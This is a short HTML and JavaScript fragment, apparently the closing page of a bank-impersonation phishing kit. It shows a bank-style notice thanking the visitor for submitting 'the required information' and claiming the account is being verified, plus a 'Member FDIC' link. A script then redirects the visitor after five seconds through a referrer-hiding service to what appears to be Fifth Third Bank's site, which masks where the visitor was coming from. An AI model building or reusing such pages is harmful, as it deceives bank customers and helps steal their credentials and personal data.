...
<div class="grid-x grid-padding-x __spacer-form grid-x__padded">
            <div class="cell">
                <div class="mtb-section-header mtb-section-header--top">
                    ...
                    <p class="lead">
                        Thank You For Providing Us The Required Information. Your Account Is Being Verified, And We Will Get Back To You If We Require Additional Information.
                    </p>
                </div>
            </div>
...
<a href="" target="_blank">Member FDIC</a>
  ...
  setTimeout(() => {
      window.location.href = 'https://nullreferer.com/?53.com';
  }, 5000);
</script>
